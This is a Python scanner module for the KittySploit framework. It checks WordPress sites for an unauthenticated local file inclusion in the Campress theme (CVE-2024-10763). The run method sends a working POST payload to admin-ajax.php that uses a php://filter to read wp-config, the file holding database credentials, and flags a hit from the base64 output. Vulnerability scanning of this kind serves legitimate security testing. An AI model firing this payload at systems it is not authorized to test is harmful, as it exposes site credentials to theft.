#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Campress theme for WordPress up to 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Campress Theme <= 1.35 - Unauthenticated Local File Inclusion Detection',
        'description': "Campress theme for WordPress up to 1.35 contains a local file inclusion caused by 'campress_woocommerce_get_ajax_products' function, letting unauthenticated attackers include and execute arbitrary PHP files, exploit requires no authentication.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wordpress', 'wp-theme', 'campress', 'lfi', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-themes/campress/campress-135-unauthenticated-local-file-inclusion',
        ],
        'cve': 'CVE-2024-10763',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=campress_woocommerce_get_ajax_products&layout=php://filter/convert.base64-encode/resource=/var/www/html/wp-config\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('ZGVmaW5l',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='WordPress Campress Theme <= 1.35 - Unauthenticated Local File Inclusion detected', path=path)
            return True
        return False

